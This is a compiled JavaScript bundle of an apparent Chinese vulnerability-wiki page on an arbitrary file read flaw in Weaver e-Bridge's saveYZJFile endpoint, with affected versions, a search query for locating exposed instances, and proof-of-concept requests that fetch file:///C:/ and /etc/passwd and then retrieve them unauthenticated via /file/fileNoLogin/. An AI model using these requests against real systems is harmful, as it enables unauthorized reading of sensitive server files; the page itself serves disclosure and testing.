(window.webpackJsonp=window.webpackJsonp||[]).push([[85],{1414:function(s,t,e){s.exports=e.p+"assets/img/fanwei-1.a06f4932.png"},1415:function(s,t,e){s.exports=e.p+"assets/img/fanwei-2.128e1c40.png"},1416:function(s,t,e){s.exports=e.p+"assets/img/fanwei-3.3b1c9341.png"},1417:function(s,t,e){s.exports=e.p+"assets/img/fanwei-4.17ec7149.png"},2395:function(s,t,e){"use strict";e.r(t);var a=e(75),r=Object(a.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"泛微oa-e-bridge-saveyzjfile-任意文件读取漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-e-bridge-saveyzjfile-任意文件读取漏洞"}},[s._v("#")]),s._v(" 泛微OA E-Bridge saveYZJFile 任意文件读取漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。")]),s._v(" "),a("h2",{attrs:{id:"影响版本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("泛微云桥 e-Bridge 2018-2019 多个版本")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('title="泛微云桥e-Bridge"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# Windows验证POC\n\n/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:e(1414),alt:"img"}})]),s._v(" "),a("p",[s._v("成功返回 "),a("strong",[s._v("id值")]),s._v(",说明含有此漏洞")]),s._v(" "),a("a-alert",{attrs:{type:"success",message:"调用查看文件接口访问 /file/fileNoLogin/id值",description:"",showIcon:""}}),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{src:e(1415),alt:"img"}})]),s._v(" "),a("h3",{attrs:{id:""}},[a("a",{staticClass:"header-anchor",attrs:{href:"#"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# Linux验证POC\n\n/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:e(1416),alt:"img"}})]),s._v(" "),a("p",[s._v("成功返回 "),a("strong",[s._v("id值")]),s._v(",说明含有此漏洞")]),s._v(" "),a("p",[s._v("调用查看文件接口访问 "),a("strong",[s._v("http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值")])]),s._v(" "),a("p",[a("img",{attrs:{src:e(1417),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);